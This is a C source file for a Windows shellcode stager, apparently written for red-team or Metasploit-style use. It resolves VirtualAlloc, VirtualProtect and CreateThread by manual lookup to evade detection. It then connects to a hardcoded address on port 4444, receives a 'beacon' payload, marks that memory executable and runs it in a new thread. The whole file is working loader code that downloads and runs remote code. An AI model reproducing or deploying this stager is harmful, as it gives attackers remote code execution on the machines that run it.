/* TODO:
 * https://github.com/rapid7/metasploit-framework/tree/master/data/headers/windows
 * https://github.com/rapid7/metasploit-framework/tree/master/data/templates/src/pe
 * https://github.com/rapid7/metasploit-framework/tree/master/external/source/shellcode/windows
 *
 * https://github.com/rapid7/metasploit-framework/tree/master/data/utilities/encrypted_payload
 *
 *
 * x86_64-w64-mingw32-gcc -o stager.exe stager.c -lws2_32
 * */

// TODO: eventually convert to c code then asm then shell code?

#include "stager.h"
#include "../utils/utils.h"
#include <stdio.h>
#include <stdlib.h>



#pragma comment(lib, "ws2_32.lib")

//bool Stager::run(const std::string& host, const std::string& port)
bool run(const char* host, const char* port)
{
    // 1. manually resolve apis (skip for now and just include the headers that import it)

    FuncVirtualAlloc pVirtualAlloc = (FuncVirtualAlloc)GetProcAddressManual("kernel32.dll", "VirtualAlloc");
    FuncVirtualProtect pVirtualProtect = (FuncVirtualProtect)GetProcAddressManual("kernel32.dll", "VirtualProtect");
    FuncCreateThread pCreateThread = (FuncCreateThread)GetProcAddressManual("kernel32.dll", "CreateThread");

    //std::cout << "1 - Starting" << std::endl;
	printf("1 - Starting\n");
    
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
        //std::cout << "WSAStartup failed" << std::endl;
        printf("WSAStartup failed\n");
        return false;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) 
	{
        //std::cout << "socket failed: " << WSAGetLastError() << std::endl;
		printf("socket failed: %d\n", WSAGetLastError());
        return false;
    }

    //std::cout << "2 - Socket created" << std::endl;
    printf("2 - Socket created\n"); 

    ADDRINFOA hints, *result = nullptr;
    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    //if (getaddrinfo(host.c_str(), port.c_str(), &hints, &result) != 0) 
    if (getaddrinfo(host, port, &hints, &result) != 0) 
	{
        //std::cout << "getaddrinfo failed" << std::endl;
		printf("getaddrinfo failed\n");
        return false;
    }

    //std::cout << "3 - Address resolved" << std::endl;
    printf("3 - Address resolved\n");

    bool connected = false;
    for (auto ptr = result; ptr != nullptr; ptr = ptr->ai_next) 
	{
        if (connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen) == 0) 
		{
            connected = true;
            break;
        }
    }
    freeaddrinfo(result);

    if (!connected) 
	{
        //std::cout << "connect failed" << std::endl;
        printf("connect failed\n");
        return false;
    }

    // 2.
    //std::cout << "4 - Connected" << std::endl;
    printf("4 - Connected\n");

    // 3. 
    //std::vector<unsigned char> shellcode(4096);
    //int bytes_received = recv(sock, (char*)shellcode.data(), shellcode.size(), 0);

	unsigned char shellcode[4096];
	//int bytes_received = recv(sock, (char*)shellcode, sizeof(shellcode), 0);
	int bytes_received = recv(sock, (char*)shellcode, 4096, 0);
    
    if (bytes_received <= 0) 
	{
        //std::cout << "recv failed, received: " << bytes_received << std::endl;
        printf("recv failed, received: %d\n", bytes_received);
        return false;
    }

    //std::cout << "5 - Received " << bytes_received << " bytes" << std::endl;
    printf("5 - Received %d bytes\n", bytes_received);

    LPVOID beacon_mem = pVirtualAlloc(0, bytes_received, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!beacon_mem) 
	{
        //std::cout << "VirtualAlloc failed: " << GetLastError() << std::endl;
        printf("VirtualAlloc failed: %d\n", GetLastError());
        return false;
    }

    memcpy(beacon_mem, shellcode, bytes_received);

    // EXECUTE_READ.
    DWORD old_prot;
    if (pVirtualProtect(beacon_mem, bytes_received, PAGE_EXECUTE_READ, &old_prot) == FALSE)
    {
        // Fail silently if we cannot make the memory executable.
        return 1;
    }

    //std::cout << "6 - Memory allocated and copied" << std::endl;
    printf("6 - Memory allocated and copied");

    // 4.
    //HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)beacon_mem, NULL, 0, NULL);
    HANDLE thread = pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)beacon_mem, NULL, 0, NULL);
    if (!thread) 
	{
        //std::cout << "CreateThread failed: " << GetLastError() << std::endl;
        printf("CreateThread failed: %d\n", GetLastError());
        return false;
    }

    //std::cout << "7 - Thread created, waiting..." << std::endl;
    printf("7 - Thread created, waiting..."); 
    WaitForSingleObject(thread, INFINITE); // Wait for thread to complete

    //std::cout << "8 - Cleaning up" << std::endl;
    printf("8 - Cleaning up"); 
    closesocket(sock);
    WSACleanup();
    return true;
}

int main()
{
    //Stager tcpStager;
    //tcpStager.run("172.18.245.234", "4444");
    //tcpStager.run("10.0.0.86", "4444");
    run("10.0.0.86", "4444");
}


